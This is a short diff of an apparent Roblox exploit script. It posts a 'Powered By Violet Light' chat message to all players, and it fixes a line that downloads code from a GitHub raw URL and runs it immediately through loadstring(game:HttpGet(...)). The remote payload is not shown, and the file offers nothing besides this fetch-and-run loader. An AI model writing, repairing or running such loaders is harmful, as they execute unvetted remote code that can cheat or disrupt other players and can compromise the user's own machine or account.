@@ -1,2 +1,2 @@
 game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Powered By Violet Light" ,"All")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/XStormDeveloper/lickmyballs/main/lickit))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XStormDeveloper/lickmyballs/main/lickit", true))()
